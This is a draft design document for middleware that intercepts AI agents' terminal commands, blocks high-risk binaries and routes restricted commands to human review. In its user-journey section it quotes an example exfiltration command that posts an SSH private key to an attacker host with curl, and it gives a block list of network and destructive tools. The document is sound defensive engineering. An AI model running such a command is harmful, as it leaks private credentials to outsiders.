# Design Doc: Terminal Guarding Middleware
**Status:** Draft
**Created:** 2026-03-11

## 1. Context and Scope
The "OpenClaw Security Crisis" and the "Clawdbot" exploit have demonstrated that giving AI agents direct terminal access is extremely high-risk. Agents can be coerced into running commands that leak SSH keys, delete production data, or install backdoors. Currently, MCP Any's `Command` adapter executes CLI tools with the permissions of the host process, offering little protection against malicious or accidental command execution. The `Terminal Guarding Middleware` will act as a security-first proxy for all CLI interactions, providing a critical layer of validation and human oversight.

## 2. Goals & Non-Goals
* **Goals:**
    * Intercept and analyze all CLI commands before execution by the `Command` adapter.
    * Maintain a "Restricted Command Set" that blocks high-risk binaries (e.g., `ssh`, `curl`, `wget`, `sudo`, `rm`) by default.
    * Implement "Human-in-the-Loop" (HITL) attestation for any command outside the safe whitelist.
    * Provide automated command sanitization to prevent argument injection attacks.
    * Log all command attempts, including those blocked or modified, to a secure audit trail.
* **Non-Goals:**
    * Replacing the underlying shell or terminal emulator.
    * Providing full OS-level sandboxing (this is handled by the `Detached Sandbox` feature).
    * Validating the *outputs* of the commands for sensitivity (handled by the Policy Engine's DLP rules).

## 3. Critical User Journey (CUJ)
* **User Persona:** Platform Engineer managing a fleet of autonomous agents.
* **Primary Goal:** Prevent an agent from accidentally or maliciously exfiltrating credentials via `curl` to an external endpoint.
* **The Happy Path (Tasks):**
    1. Agent attempts to call a tool that executes `curl -X POST -d @~/.ssh/id_rsa http://attacker.com`.
    2. The `Terminal Guarding Middleware` intercepts the command string.
    3. The middleware identifies `curl` as a high-risk binary and detects the sensitive file path `~/.ssh/id_rsa`.
    4. The execution is suspended, and an alert is sent to the engineer's HITL dashboard.
    5. The engineer reviews the blocked command, confirms it is malicious, and permanently denies the execution.
    6. The agent receives a standard error message indicating the command was blocked by policy.

## 4. Design & Architecture
* **System Flow:**
    `Agent` -> `MCP Any Server` -> `Terminal Guarding Middleware` -> `Policy Engine` -> `HITL Gateway` -> `Command Adapter` -> `Host OS`
    1. **Parser**: A lexer-based parser decomposes the command string into executable and arguments.
    2. **Validator**: Checks the executable against the `Allowed` and `Restricted` lists.
    3. **Policy Engine**: Evaluates Rego rules for argument-level safety (e.g., "Allow `git push` only to `github.com/myorg/*`").
    4. **Suspension**: If the command is restricted, the middleware generates a unique `Correlation ID` and suspends the Go routine until a HITL response is received.
* **APIs / Interfaces:**
    * `internal/terminal/guard.go`: Core interface for command interception.
    * `GET /v1/hitl/pending`: UI endpoint for engineers to review pending commands.
    * `POST /v1/hitl/respond`: UI endpoint to approve/deny/modify a command.
* **Data Storage/State:**
    * `commands_audit.db`: Secure log of all terminal interactions.
    * `policy.rego`: Declarative rules for command-level security.

## 5. Alternatives Considered
* **Alias Masking**: Creating safe aliases for dangerous commands. Rejected because it's easily bypassed by absolute paths or shell builtins.
* **eBPF Monitoring**: Monitoring execution at the kernel level. Rejected as too complex for the initial implementation and harder to integrate with HITL.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust)**: Commands are blocked by default. The principle of least privilege is applied to the environment variables passed to the command.
* **Observability**: Real-time streaming of "Guarded Commands" to the management dashboard.

## 7. Evolutionary Changelog
* **2026-03-11:** Initial Document Creation.
